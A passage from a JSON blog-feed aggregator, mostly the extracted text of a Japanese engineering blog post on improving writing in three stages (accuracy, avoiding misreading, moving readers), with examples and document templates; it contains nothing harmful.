cargo-watch（アーカイブ済み）","isoDate":"2025-10-16T08:08:00.000Z","dateMiliSeconds":1760602080000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"ディレクトリ構成 ~ハイブリッド型編~","link":"https://sreake.com/blog/hybrid-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、ディレクトリ構成に悩む現場に向けて、ハイブリッド型構成をご紹介します。 ⚠️ この構成が「唯一の正解 […]The post ディレクトリ構成 ~ハイブリッド型編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-16T04:41:28.000Z","dateMiliSeconds":1760589688000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Prometheus + Step Functions + Lambdaで構築するサーバレスオンコール基盤","link":"https://zenn.dev/nextbeat/articles/oncall_architecture_nb","contentSnippet":"1. 前提 ブログを書いた背景Lambda のランタイムバージョン更新対応に携わる中で、既存のオンコール基盤のリファクタリングと改修を実施しました。具体的な実装や要件ははあまり記述していませんが、アーキテクチャの参考例になればと思いブログに起こしました。 オンコール体制の方針弊社では全員 CTO というテーマを掲げて、各エンジニアが主体的に事業及びプロダクトに関わる文化を醸成しています。それに伴い、オンコール体制もエンジニア全員が参加する体制をとっています。全員CTOとは？と気になる方はEntrance Book覗いてみてください\uD83D\uDE04https://note....","isoDate":"2025-10-14T06:25:59.000Z","dateMiliSeconds":1760423159000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"文章力を分解してちゃんと文章を書く。","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/14/133602","contentSnippet":"はじめに文章を読むとは、自分の中で文章を再構築するということである。あなたは技術記事を読んで「わかった」と思ったのに、いざ実装しようとすると何も書けなかった経験はないだろうか。ドキュメントを読んで「理解した」と思ったのに、同僚に説明しようとすると言葉が出てこなかった経験はないだろうか。私にはある。何度もある。悲しい。これは単なる理解不足ではない。もっと根本的な問題だ。私たちは「読む」と「書く」を別々のスキルだと思い込んでいる。しかし、それは違うと私は考えている。読むとき、私たちは頭の中で文章を再構築している。書き手の言葉を、自分のスキーマ（枠組み）に翻訳し、自分の言葉で理解し直している。読むことは、実は書くことなのだ。ただ、それが頭の中で行われているだけだ。だから、「わかった」と思っても実装できないのは、頭の中で再構築したものと現実の折り合いがついていないのだ。自分の言葉で書き直せていないのだ。「読解力を分解してちゃんと文章を読む。」という記事を書いたあと、私はあることに気づいた。文章を読む力を分解して説明しようとすればするほど、自分が書く文章の問題点が見えてくるのだ。読み手がどこでつまずくかを想像すると、自分が読むときにどこでつまずいていたかが見えてくる。syu-m-5151.hatenablog.comそして、ある結論に辿り着いた。書けない人間は、読めない。これは挑発でも誇張でもない。書く力と読む力は、コインの表裏ではなく、同じものなのだ。書く経験を通じて、私たちは「文章がどのように読まれるか」を学ぶ。一文が長すぎると読み手の認知負荷が上がること。主語が不明確だと読み手が推測を強いられること。構造が曖昧だと読み手が迷子になること。逆もまたあることだ。読む経験を通じて、私たちは「文章がどのように書かれるべきか」を学ぶ。明快な文章はどのような構造を持っているか。わかりやすい説明はどのように展開されるか。読解力の記事では、読む力を3つの段階に分解した。今回の記事では、書く力を同じように分解していく。第1段階：正確に書く第2段階：誤読されないように書くスキーマを想像し、知識の呪いを断ち切る。認知バイアスを考慮し、読み手が必要な情報にたどり着ける文脈を設計する。第3段階：心を動かすように書く書くことで、初めて読めるようになる。読むことで、初めて書けるようになる。この循環的な関係を理解することが、文章力を高める第一歩だ。そして、この循環が複利的に機能する。書く力が向上すると読む力も向上し、読む力が向上するとまた書く力も向上する。この正のフィードバックループが、指数関数的な成長を生み出す。片方だけを鍛えようとしても、成長は頭打ちになる。両輪を回すことが、文章力を本質的に高める唯一の道だ。では、なぜ書く力と読む力は、これほどまでに密接に結びついているのだろうか。その理由を、まず理解する必要がある。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。書く力と読む力は、なぜ表裏一体なのか書けないということは、理解していないということだエラーログを読めない人は、エラーメッセージを吐き出させるときも曖昧な表現をする。「エラーが発生しました」とだけ書いて、どのエラーが、どの条件で、何が原因で発生したのかを書かない。なぜか？自分がエラーログを読むときに、これらの情報を抽出できていないからだ。というか想像できていないからだ。読んで困った時の自分を。読むときに「どこに何が書いてあるか」を理解できていない人は、吐き出させるときにも「どこに何を書くべきか」を理解できない。これは単なる不注意ではない。書こうとして初めて、「何をどの順序で書くべきか」という問いに直面する。書こうとして初めて、「読み手は何を知りたいのか」という問いに直面する。この問いと格闘する過程で、私たちは文章の構造を深く理解する。技術記事を読んで「わかった」と思うのは、個々の文章を理解したということだ。しかし、それを実装できないのは、全体の構造を理解していないからだ。これは、ラバーダック・デバッギングと同じ原理だ。コードを声に出して説明しようとすると、理解の穴が見えてくる。文章を書こうとすると、読解の穴が見えてくる。書こうとして手が止まる瞬間、そこに理解の穴がある。誤読された経験が、誤読を防ぐ力を育てる理解の穴が見えるだけでは十分ではない。さらに重要なのは、自分が書いた文章がどう読まれるかを知ることだ。「この文章は誤解される」と事前に気づくには、自分が誤読された経験が必要だ。吐き出させた文章が意図と違う形で受け取られた経験。怒りのコメントを受けた経験。これらの痛い経験を通じて、人は「どんな書き方が誤解を生むか」を学ぶ。誤読には、いくつかのパターンがある。パターン1：主語の曖昧さによる誤読この機能の実装が遅れています。仕様が複雑で理解に時間がかかっています。書き手は「私」のつもりで書いている。しかし、読み手は「チーム全体」だと解釈するかもしれない。この誤読は、書き手が主語を省略したことで生じる。パターン2：文脈の欠如による誤読この実装方法は悪くない。書き手は、他の実装方法と比較して「悪くない」と言っている。しかし、読み手は、この実装方法が「及第点」程度だと解釈するかもしれない。パターン3：二重否定による誤読この問題は無視できない。書き手は「重要だ」と言いたい。しかし、読み手は「ある程度重要だが、最優先ではない」と解釈するかもしれない。誤読された経験は、痛い。しかし、その痛みこそが、書く力と読む力を同時に高める。書く経験が乏しい人は、読むときにも「書き手の意図」を想像できない。スキーマは読み書き両方で機能する誤読を防ぐには、さらに深い理解が必要だ。それは、読み手と書き手でスキーマが異なるという理解だ。人はスキーマを通して文章を理解する。スキーマとは、私たちが頭の中に持っている知識の枠組みのこと。例えば、「非同期処理」というキーワードを見たとき、Rustエンジニアの頭の中では、tokio、async/await、Future traitといった関連する概念が自動的に呼び出される。しかし、スキーマは読むときだけでなく、書くときにも機能している。そして、書くときのスキーマの働き方が、しばしば問題を引き起こす。あなたが「非同期処理を実装した」と書くとき、あなたの頭の中には「非同期処理」についての豊富なスキーマがある。だから、読み手もそのスキーマを共有していると無意識に仮定してしまう。これを「知識の呪い」と呼ぶ。【悪い例】非同期処理を実装しました。これでパフォーマンスが改善されます。書き手にとって、これは十分に明確だ。しかし、読み手はどうか？Rustエンジニアは「tokioのasync/awaitを使うのか」と想像する。Goエンジニアは「goroutineを使うのか」と想像する。非同期処理に馴染みのないエンジニアは「何が改善されるのか」すらわからない。書く力が高い人は、「読み手は自分とは違うスキーマを持っている」と意識的に認識する。そして、読み手のスキーマを想像し、橋を架けるように書く。【良い例】非同期処理を実装しました。従来は3つのマイクロサービスへのHTTPリクエストを順番に実行していたため、合計で3秒かかっていました。今回、Rustのtokioとasync/awaitを使ってこれらのリクエストを並行実行するように変更しました。その結果、3つのリクエストが同時に実行されるため、最も遅いリクエスト（1秒）の時間だけで完了するようになりました。これにより、全体の処理時間が3秒から1秒に短縮され、APIのレスポンスタイムが大幅に改善されました。では、この「読み手のスキーマを想像する力」は、どうやって獲得できるのか？答えは、読み手として多様な文章に触れ、「わからない」を経験することだ。自分が知らない分野の技術記事を読んで、「専門用語が多くてわからない」と感じる。その経験が、書き手として「専門用語を使うときは説明を加えよう」という意識を育てる。書くことは、読む力を鍛える最良の訓練ここまで見てきたように、書く経験は読む力を高める。しかし、その逆も真だ。読む経験は書く力を高める。この循環を最も効果的に回す方法が、実は書くことなのだ。なぜか？書こうとすると、言語化できない部分に直面するからだ。頭の中では理解しているつもりでも、いざ文章にしようとすると言葉が出てこない。この瞬間、あなたは「本当は理解していなかった」と気づく。しかし、問題はもっと深い。ちゃんと読むとは、自分の中でちゃんと書くということでもある。複雑な文章を読むとき、私たちは無意識のうちに「これはつまり、こういうことだな」と自分の言葉で要約している。この「内なる執筆」ができない人は、文章を読んでも理解が浅い。例を見てみよう。技術記事に「エラーハンドリングを実装すると、システムの信頼性が向上する」と書いてある。浅い読み方：「エラーハンドリングを実装すると信頼性が向上するのか。なるほど。」深い読み方：「エラーハンドリングを実装すると信頼性が向上する、と言っている。なぜか？エラーハンドリングがないと、エラーが発生したときにプログラムがパニックして停止してしまう。その結果、ユーザーはサービスを使えなくなる。一方、エラーハンドリングを実装すれば、エラーが発生してもプログラムは継続でき、ユーザーに明確なエラーメッセージを返せる。つまり、『信頼性が向上する』とは『エラー時でもサービスを継続できる』という意味だな。」深い読み方をしている人は、頭の中で文章を書いている。この「内なる執筆」の能力は、実際に書く経験を通じて鍛えられる。外に向けて文章を書くとき、私たちは「どう表現すれば伝わるか」を考える。この試行錯誤が、内なる執筆の能力を高める。だから、外に向けて書く訓練をすることは、内に向けて書く力も鍛える。このように、書く力と読む力は表裏一体だ。では、具体的にどう書けばよいのか。読解力の記事と同様、書く力も3つの段階に分解して見ていこう。第1段階：正確に書く読解力の第1段階は「書かれていることを正確に理解する力」だった。文章力の第1段階は、「伝えたいことを正確に伝える力」だ。これは、技術的なスキルだ。感性や才能ではなく、学習可能なスキルだ。悪文とは何か。それは、一義的に解釈できない文章だ。一つの文を読んで、複数の意味に解釈できてしまう。主語が不明確で、誰が何をしているのかわからない。修飾関係が複雑で、何がどこにかかっているのか判然としない。こうした構造的な問題が、悪文を生む。文章を書くコツは、芸術的な名文を書くことではない。読みにくい「悪文」を書かないことである。では、悪文を防ぐにはどうすればよいか。ここでは四つ紹介します。他にも悪文を分かりやすくする方法はいくらかありますがたくさん本が出ていますのでそちらを参考にしてほしいです。悪文の構造　――機能的な文章とは (ちくま学芸文庫)作者:千早耿一郎筑摩書房Amazon「文章術のベストセラー100冊」のポイントを1冊にまとめてみた。作者:藤\uD842\uDFB7 豊,小川 真理子日経BPAmazon一文一義で書く【悪い例】デプロイ作業中にDBマイグレーションが失敗したため、問題箇所をスキップすればデプロイは可能ですが、Xモジュールへの影響が不明なので、明日Yさんが出社してから対応するか、今日スキップしてデプロイするか、どちらが良いと思いますか？この一文には、6つの義が詰め込まれている。読み手は、これらすべてを一度に処理しなければならない。認知負荷が高すぎる。なぜ一文一義が重要なのか？人間の作業記憶（ワーキングメモリ）の容量は限られている。一文が長く、複数の義が含まれていると、読み手は文の途中で最初の部分を忘れてしまう。一文一義で書くことは、読み手の認知リソースを尊重することだ。【良い例】デプロイ作業中、DBマイグレーションに失敗しました。問題箇所をスキップすればデプロイは可能ですが、Xモジュールへの影響が不明です。対応方針を相談させてください。以下の2つの選択肢のうち、どちらが良いでしょうか？A. 明日Yさんが出社後、一緒に影響範囲を調査してから対応するB. 今日、問題箇所をスキップしてデプロイする一文一義の原則を守るには、3つのルールがある。ルール1：文章は短くするルール2：形容詞と被形容詞はなるべく近づけるルール3：一つの文に、主語と述語はひとつずつ短く、近く、シンプルに。これが機能的な文章の基本だ。主語を明示する一文一義を守るだけでは不十分だ。次に重要なのは、誰が何をしているかを明確にすることだ。日本語は主語を省略できる言語だ。しかし、文章を書くとき、特に技術文書やビジネス文書を書くとき、文脈が常に明らかとは限らない。主語を省略すると、3つの問題が生じる。問題1：責任の所在が不明確になる【悪い例】バグを修正しました。【良い例】私がバグを修正しました。問題2：行為者が不明確になる【悪い例】テストを実行して、結果を確認しました。【良い例】私がテストを実行しました。Aさんが結果を確認しました。問題3：複数の解釈が可能になる【悪い例】レビュー後、デプロイしました。【良い例】Aさんのレビュー後、私がデプロイしました。では、どうすればよいか？主語を省略してもよい場合と、省略してはいけない場合を区別する。主語を省略してもよい場合：直前の文と同じ主語の場合、文脈から主語が明らかな場合。主語を省略してはいけない場合：主語が変わる場合、責任の所在を明確にする必要がある場合、複数の解釈が可能な場合。冗長さを避ける正確に書くことは重要だが、冗長に書くことは避けなければならない。必要な情報だけを、必要な長さで書く。冗長な文章は、読み手の時間を無駄にする。忙しいエンジニアは、冗長な文章を読む時間がない。冗長な文章は、重要な情報を埋もれさせる。冗長さには、いくつかのパターンがある。パターン1：同じことを繰り返す【悪い例】この問題は重要な問題です。なぜなら、この問題を放置すると、ユーザーに影響が出る重大な問題だからです。【良い例】この問題は重要です。放置するとユーザーに影響が出ます。パターン2：不要な修飾語を使う【悪い例】非常に重要な機能の実装を丁寧に進めています。【良い例】重要な機能を実装中です。「非常に」「丁寧に」といった修飾語は、情報を追加していない。削除しても意味は変わらない。パターン3：回りくどい表現を使う【悪い例】バグを修正することに成功しました。【良い例】バグを修正しました。「〜することに成功しました」は、「〜しました」で十分だ。冗長さを避けるには、3つの原則がある。原則1：削除できる言葉は削除する原則2：同じ情報は一度だけ書く原則3：具体的な動詞を使う簡潔さは、尊重の表現だ。読み手の時間を尊重し、認知リソースを尊重する。構造を明確にする一文一義で書き、主語を明示し、冗長さを避ける。しかし、それだけでは不十分だ。文章全体の構造を明確にする必要がある。箇条書きと文章の使い分けは、書き手の重要なスキルだ。並列関係の情報は箇条書きで、因果関係の情報は文章で。なぜ構造が重要なのか？構造は、思考の可視化だからだ。構造を明確にする最も基本的な単位は、パラグラフ（段落）だ。一つのパラグラフには、一つの主張しか含めない。構造を明確にするには、3つのレベルがある。レベル1：文のレベルレベル2：パラグラフのレベルレベル3：セクションのレベルこの3つのレベルの構造が明確な文章は、読み手にとって理解しやすい。第1段階の「正確に書く」力を身につけると、少なくとも誤解されない文章が書けるようになる。しかし、それだけでは不十分だ。読み手は、あなたの意図を汲み取ろうとしてくれるとは限らない。次の段階では、より能動的に誤読を防ぐ技術を学ぶ。ユーザーの問題解決とプロダクトの成功を導く　エンジニアのためのドキュメントライティング作者:ジャレッド・バーティ,ザッカリー・サラ・コーライセン,ジェン・ランボーン,デービッド・ヌーニェス,ハイディ・ウォーターハウス日本能率協会マネジメントセンターAmazon第1段階の実践訓練訓練1：一文一義の練習訓練2：主語の明示訓練3：冗長さの削除訓練4：構造の可視化訓練5：要約を書くAIを使った第1段階の訓練生成AIは、第1段階の訓練に有効だ。AIに構造をチェックさせるAIの文章を添削する重要な注意点第2段階：誤読されないように書く読解力の第2段階は「書かれていない意図を汲み取る力」だった。文章力の第2段階は、「読み手の誤読を防ぐ力」だ。第1段階では、文章の構造的な問題を防ぐ方法を学んだ。一文一義で書き、主語を明示し、冗長さを避け、構造を明確にする。しかし、構造が正しくても、誤読は起きる。なぜか？読み手と書き手でスキーマが異なるからだ。前のセクションで「知識の呪い」について説明した。ここでは、その呪いを断ち切り、読み手のスキーマに合わせて書く具体的な方法を学ぶ。「何回説明しても伝わらない」はなぜ起こるのか？　認知科学が教えるコミュニケーションの本質と解決策作者:今井むつみ日経BPAmazon技術ドキュメントの品質は、ここで決まる特に技術ドキュメントにおいては、第2段階が品質を決定づける。第1段階の「正確に書く」は、技術ドキュメントの必要条件だ。構造が曖昧で、主語が不明確で、冗長な技術ドキュメントは、そもそも読むに値しない。しかし、第1段階をクリアしただけでは、良い技術ドキュメントにはならない。技術ドキュメントの良し悪しを分けるのは、読み手が迷わず、誤解せず、必要な情報にたどり着けるかだ。これこそが第2段階の本質だ。構造的には正しいが、読み手のスキーマを無視したドキュメント。専門用語が説明なしに使われ、前提知識が明示されず、文脈が欠如しているドキュメント。こうしたドキュメントは、正確ではあるが、使えない。逆に、読み手のスキーマを想像し、知識の呪いを断ち切り、読み手が必要な情報にたどり着ける文脈を設計したドキュメントは、読み手を迷わせない。読み手は、探している情報をすぐに見つけられる。誤解なく理解できる。そして、次のアクションを取れる。APIリファレンス、設計書、運用手順書、トラブルシューティングガイド。これらの技術ドキュメントは、第3段階の「心を動かす」手法は不要だ。感情に訴える必要はない。しかし、第2段階の「誤読されないように書く」技術は、絶対に必要だ。技術ドキュメントを書くとき、常に自問すべきだ。「読み手は、この情報を探しているとき、どんな状況にいるのか？」「読み手は、どのくらいの前提知識を持っているのか？」「読み手は、この用語を知っているのか？」これらの問いに答えることが、使える技術ドキュメントと使えない技術ドキュメントを分ける。読み手のスキーマを想像するドキュメントを書くとき、まず問うべきは「読み手は誰か？」だ。読み手は誰か？何を知っていて、何を知らないか？どんな問題を解決しようとしているか？知識の呪いを断ち切るには、3つの方法がある。方法1：具体化する方法2：例示する方法3：段階的に説明する読み手のスキーマを想像する能力は、読み手として多様な文章に触れ、「わからない」を経験することで獲得できる。しかし、スキーマを想像するだけでは不十分だ。次に重要なのは、読み手の認知バイアスを考慮することだ。認知バイアスを考慮する読み手がどんなバイアスを持っているかを想定し、誤読を防ぐ。パターン1：二重否定による混乱【誤読されやすい例】この実装方法は悪くない。【誤読されにくい例】この実装方法は、実用上十分な性能を持っています。具体的には、毎秒1000リクエストを処理できます。パターン2：曖昧な数量表現【誤読されやすい例】この問題は重要です。【誤読されにくい例】この問題は、今週中に対応が必要です。なぜなら、放置するとユーザーがログインできなくなるからです。パターン3：主観的な評価【誤読されやすい例】このツールは使いやすい。【誤読されにくい例】このツールは、5分で環境構築できます。コマンド一つで起動でき、GUIで操作できます。認知バイアスを考慮した文章は、客観的で、具体的で、測定可能だ。文脈を設計する技術記事を書くとき、どこまで前提知識を説明すべきか。この判断には原則がある。原則1：読み手のレベルに合わせる原則2：この記事で必要な知識だけを説明する原則3：外部リソースを活用するテンプレートを活用する第2段階における最も実用的な方法の一つが、テンプレートの活用だ。テンプレートは、第1段階の「構造を明確にする」技術と似ているが、その目的は異なる。第1段階では、書き手が構造的に正しい文章を書くためのツールだった。第2段階では、読み手が迷わず、必要な情報にたどり着けるためのツールだ。テンプレートには、3つの利点がある。利点1：読み手の予測可能性を高める利点2：必要な情報を漏れなく提供する利点3：読み手の認知負荷を減らす例えば、バグ報告のテンプレートは次のようになる。## 概要[バグの概要を一行で]## 再現手順1. [手順1]2. [手順2]3. [手順3]## 期待される動作[何が起きるべきか]## 実際の動作[実際に何が起きたか]## 環境- OS: - ブラウザ: - バージョン: ## 追加情報[スクリーンショット、ログなど]このテンプレートを使えば、読み手（バグを修正するエンジニア）は、必要な情報をすぐに見つけられる。「再現手順はどこだ？」「どの環境で起きたんだ？」と探す時間を削減できる。技術ドキュメントのテンプレートは次のようになる。## 概要[この文書が何について説明するか]## 前提条件[読者が知っているべきこと、必要な環境]## 手順[具体的な手順、コード例]## トラブルシューティング[よくある問題と解決法]## 参考資料[関連するドキュメント、リンク]プルリクエストのテンプレートは次のようになる。## 変更内容[何を変更したか]## 変更理由[なぜ変更したか]## 影響範囲[どの機能に影響するか]## テスト[どのようにテストしたか]## レビューのポイント[レビュアーに特に見てほしい箇所]テンプレートを使う際の注意点：テンプレートは、読み手を助ける道具だ。しかし、テンプレートに縛られすぎてはいけない。状況に応じて、テンプレートをカスタマイズする。不要なセクションは削除し、必要なセクションは追加する。重要なのは、「読み手が必要な情報にたどり着けるか」という問いだ。テンプレートは、この問いに答えるための手段であって、目的ではない。第2段階の「誤読されないように書く」力を身につけると、読み手に正確に情報を伝えられるようになる。読み手のスキーマを想像し、認知バイアスを考慮し、読み手が必要な情報にたどり着ける文脈を設計する。しかし、それだけでは不十分だ。情報を伝えるだけでなく、読み手の心を動かす必要がある。なぜなら、心が動かなければ、読み手は行動しないからだ。次の段階では、その方法を学ぶ。第2段階の実践訓練訓練1：説明を書くスキーマを想像しながら書く訓練だ。「この人は何を知っていて、何を知らないか？」を考える。具体的には、次のような取り組みができる。初心者向けに、自分が得意な技術を説明する記事を書く。専門用語を使うたびに、「この用語は説明が必要か？」と自問する。書いた後、その分野に詳しくない人に読んでもらい、わからなかった箇所を聞く。訓練2：批判的に読む訓練3：テンプレートの作成エストなど）のテンプレートを作る。ただし、第1段階の「構造を明確にする」だけでなく、「読み手が必要な情報にたどり着けるか」という視点で作る。読み手が最も知りたい情報は何か？それをどこに配置すれば見つけやすいか？AIを使った第2段階の訓練AIに読み手のスキーマを想像させるAIと対話しながら書く重要な注意点第3段階：心を動かすように書く読解力の第3段階は「本当に重要なことを見抜く力」だった。文章力の第3段階は、「読み手の心を動かす力」だ。なお、この第3段階は、技術記事、ブログ、プレゼンテーションなど、読者の心を動かす必要がある文章に適用される。技術ドキュメント（APIリファレンス、設計書、仕様書など）では、第1段階と第2段階で十分だ。むしろ、客観性と正確性が重視される技術ドキュメントには、この段階の手法は合わない場合が多い。「読みたいこと」とは何か？多くの人が誤解する。「読みたいこと」とは、「自由に好き勝手に自分の気持ちを書くこと」ではない。「読みたいこと」とは、自分が読者だったら読みたいと思うものだ。自分が本屋で金を出して買いたいと思うもの。自分が時間を使って読みたいと思うもの。書きたいことではない。読みたいことだ。これは、他人の視点に立てという話ではない。徹底的に自分の視点で、自分が読者として読みたいかどうかを問うということだ。この問いは、書きたいことを書く自由よりも、はるかに厳しい制約だ。第1段階では構造を学び、第2段階では誤読を防ぐ技術を学んだ。しかし、それだけでは読み手の心は動かない。心を動かすには、まず読者を引きつける必要がある。三行で撃つ 〈善く、生きる〉ための文章塾作者:近藤 康太郎ＣＥメディアハウスAmazon最初の三行で撃つ最初の一文、長くても三行くらいで心を撃たないと、忙しい読者は逃げていく。読者はあなたに興味がない。読者にとって、あなたの書こうとするテーマはどうでもいい。冷厳な現実だ。では、どうすれば最初の三行で読者を撃てるのか？方法1：問題を提示する方法2：驚きを与える方法3：具体的な利益を示すしかし、最も重要なのは、お前が何者かは、読者にとって関係ないということだ。【悪い例】私は10年間、技術記事を書いてきました。その経験から学んだ文章術を共有します。読者は、基本的にあなたの経歴に興味がない。あなたが何年エンジニアをやってきたか、どんな実績があるか、ほとんどの読者にとってどうでもいい。読者が知りたいのは、「この記事は自分の問題を解決してくれるのか？」「面白い時間が過ごせるか？」「読む価値のある新しい視点があるのか？」「具体的で実践できる内容なのか？」「読んだ後、自分は何ができるようになるのか？」。これらの問いだけだ。書き手の自己紹介から始まる記事は、これらの問いに答えていない。だから、読者は離れていく。【良い例】エラーメッセージを読めない人は、エラーメッセージを吐き出させるときも曖昧だ。なぜか？この書き出しは、問題提起だ。読者は「なぜだろう？」と思う。書き出しで読者を引きつけることができた。しかし、心を動かすにはそれだけでは不十分だ。次に必要なのは、空虚な言葉を避けることだ。常套句を避ける書き出しで読者を引きつけても、内容が空虚なら読者は離れていく。そして、内容を空虚にする最大の敵が、常套句だ。常套句は、まさに「わかったつもり」を生み出す装置だ。このアプローチはベストプラクティスです。「ベストプラクティス」とは何か？誰が決めたのか？どういう文脈で最適なのか？なぜ最適なのか？これらの問いに答えない限り、「ベストプラクティス」という言葉は空虚だ。常套句には、いくつかのパターンがある。パターン1：抽象的なバズワードラクティス、レバレッジ、シナジー、エンパワーメント、イノベーション。これらの言葉は、具体的な内容を隠蔽する。パターン2：「としたもんだ表現」パターン3：擬音語・擬態語・流行語常套句を避けることは、思考を深めることだ。「ベストプラクティス」と書こうとして、「本当にベストなのか？」と自問する。この思考の過程が、文章を具体的にし、説得力を高める。常套句を避け、具体的に書くことができたら、次は自分にしか書けない内容を書く。自分の言葉で書く【常套句に逃げる例】Rustの所有権システムは学習が難しい。でも、理解すれば強力だ。これは誰でも書ける文章だ。【自分の言葉で書く例】私がRustの所有権システムを理解するのに、3ヶ月かかった。最初の1ヶ月は、borrowチェッカーのエラーが理解できず、「なぜこのコードが動かないのか」と毎日フラストレーションを感じていた。「cannot borrow `*x` as mutable because it is also borrowed as immutable」このエラーメッセージを見るたびに、「Cのポインタのように自由に使わせてくれよ」と思っていた。転機は、所有権を「責任の所在」として捉え直してからだ。「このデータに対する責任は誰が持つのか」と考えるようになってから、borrowチェッカーのメッセージが「監査人の指摘」として理解できるようになった。この文章は、あなたにしか書けない。あなたの体験、あなたの発見だ。自分の言葉で書くには、3つの要素が必要だ。要素1：具体的な体験要素2：五感で世界を切り取る要素3：思考の過程自分の言葉で書くとは、言い換えることだ。「所有権」という抽象的な概念を、「責任の所在」という具体的な比喩で言い換える。言い換えるとは、考えることだ。しかし、自分の言葉で書くだけでは不十分だ。言葉だけでは、読み手の心は十分には動かない。次に必要なのは、エピソードの力だ。技術ブログの書き方はここに書いているので読んでみてほしいです。syu-m-5151.hatenablog.comsyu-m-5151.hatenablog.com響く文章は説明しない【説明する例】ドキュメントを書くことは重要です。なぜなら、ドキュメントがないとユーザーが困るからです。説明は響かない。【エピソードで語る例】私が初めてオンコール当番を担当したとき、深夜2時にアラートが鳴った。Datadogのダッシュボードには、「CPU usage > 80%」というアラートしか表示されていなかった。「どのサービスのCPUが高いのか」「何が原因なのか」「どうやって対処すればいいのか」何もわからず、私は1時間を無駄にした。結局、先輩を叩き起こして対処してもらった。先輩は5分で原因を特定し、10分で対処した。翌朝、先輩に聞いた。「なぜそんなに早く対処できたんですか？」先輩は言った。「アラートに必要な情報が書いてあったからだよ」そのとき誓った。自分がアラートを作るときは、必ずRunbookへのリンクを含めようと。それから3年、私はこの誓いを守っている。エピソードは響く。具体的な場面、具体的な感情、具体的な決断。これらが、読み手の心を動かす。なぜエピソードは説明よりも響くのかエピソードが響く理由は、共感にある。読み手は、あなたの物語の中に自分を見出す。「深夜2時のアラート」「何もわからない焦り」「先輩を叩き起こす申し訳なさ」。これらの感情は、多くのエンジニアが経験したことがある。あるいは、いつか経験するかもしれない。だから、読み手は「ああ、わかる」と思う。この「わかる」という感覚が、共感だ。共感は、説明では生まれない。「ドキュメントは重要です」という説明は、頭では理解できる。しかし、心は動かない。一方、エピソードは、読み手を物語の中に引き込む。読み手は、あなたの経験を追体験する。あなたの焦りを感じ、あなたの学びを共有する。共感してもらえる物語には、3つの条件がある。条件1：普遍的な感情を含む条件2：具体的な状況を描く追体験できる。「1時間を無駄にした」という具体的な時間。「先輩を叩き起こした」という具体的な行動。条件3：弱さを見せる共感は、信頼を生む。読み手があなたの物語に共感すると、あなたの言葉を信頼するようになる。「この人は、自分と同じ問題に直面して、それを乗り越えた人だ」。この信頼が、読み手を行動に移させる。説明では信頼は生まれない。しかし、共感できる物語は、信頼を築く。ただし、共感を意図的に操作しようとしてはいけない。作られた感情や、誇張された困難は、読み手に見抜かれる。本当に経験したこと、本当に感じたこと、本当に学んだことを書く。その誠実さが、最も強い共感を生む。エピソードで語るには、ストーリーの構造が必要だ。状況 - どんな状況だったか問題 - 何が問題だったか行動 - 何をしたか結果 - どうなったか学び - 何を学んだか自分の言葉で書き、共感してもらえるエピソードで語る。しかし、それでも心を動かすには、もう一つ必要なものがある。それは、あなたの生き方や物語そのものだ。書くことは生きること「書くことは生きること」。文章を書くことは、技術ではない。生き方だ。思索が深まるほどに、世界の切り取り方が変わり、自分が変わる。技術記事を書くとき、私たちは技術を説明しているだけではない。私たちは、技術を通して世界を理解している。「なぜこの技術は存在するのか」「どんな問題を解決するのか」「どんな未来を可能にするのか」。これらの問いに答えることは、技術を理解することであり、同時に世界を理解することだ。そして、これらの問いに答える過程で、私たちは自分自身を理解する。書くことで、私たちは自分になる。書くことは、自分の物語を紡ぐこと書くことは、単に情報を伝えることではない。自分の物語を紡ぐことだ。あなたがエンジニアとして生きてきた日々。深夜のデバッグ、突然の本番障害、チームでの議論、新しい技術との出会い、失敗から学んだ教訓。これらすべてが、あなたの物語だ。書くとは、これらの断片的な経験を、一つの物語として編集することだ。物語には、3つの力がある。力1：意味を与える力力2：つながりを生む力力3：未来を変える力しかし、物語を紡ぐには、勇気が必要だ。自分の失敗を書くこと。「わからなかった」「1時間を無駄にした」「先輩を叩き起こした」。これらの弱さを見せることは、恥ずかしい。しかし、完璧な成功物語は、誰の心も動かさない。読み手が求めているのは、完璧なヒーローではない。同じように悩み、同じように失敗し、それでも前に進んだ人の物語だ。あなたの物語は、すでにある。日々の仕事の中で、あなたは物語を生きている。書くことは、その物語を可視化することだ。そして、可視化することで、物語はより明確になる。「自分は何を大切にしているのか」「どんな価値観で生きているのか」「どこに向かっているのか」。物語を書くことで、あなたは自分の物語を理解する。わたしにしか、書けないものは、ある。わたしにしか、紡げない物語は、ある。そう信じることから、文章は始まる。第3段階の実践訓練なお、これらの訓練は、技術記事、ブログ、プレゼンテーションを書く人向けだ。技術ドキュメントを書く人は、第1段階と第2段階の訓練に集中してほしい。訓練1：書き出しを3パターン書く訓練2：常套句を見つけて書き直すラクティス」→「なぜベストなのか？どういう条件で？」と問う。技術記事では、抽象的な言葉が説得力を失わせる。訓練3：自分の体験を書く訓練4：説明ではなく、エピソードで語る訓練5：自分の文章を読み直すAIを使った第3段階の訓練AIに書き出しを生成させて、添削するAIに常套句を指摘させるAIに自分の文章を批判させるAIには書けないものを書くおわりに「読解力を分解してちゃんと文章を読む。」を書いたとき、私は気づいた。読む力を説明しようとすることは、書く力を鍛えることでもあると。そして今、「文章力を分解してちゃんと文章を書く。」を書き終えて、改めて実感する。書く力を説明しようとすることは、読む力を鍛えることでもあると。読む力と書く力は、別々のスキルではない。同じスキルの異なる側面だ。この記事の冒頭で、私はこう書いた。「技術記事を読んで『わかった』と思ったのに、いざ実装しようとすると何も書けなかった経験はないだろうか」。なぜ実装できないのか。答えは明確だ。頭の中で再構築できていないからだ。読むとは、実は書くことなのだ。ただ、それが頭の中で行われているだけだ。だから、読む力を高めたいなら、書くことだ。書く力を高めたいなら、読むことだ。この循環が、複利的に機能する。第1段階では、正確に書く技術を学んだ。一文一義、主語の明示、構造の明確化。これは、悪文を書かないための必要条件だ。第2段階では、誤読を防ぐ技術を学んだ。読み手のスキーマを想像し、知識の呪いを断ち切り、文脈を設計する。特に技術ドキュメントでは、この段階が品質を決定づける。第3段階では、心を動かす技術を学んだ。書き出しで引きつけ、常套句を避け、自分の言葉で語り、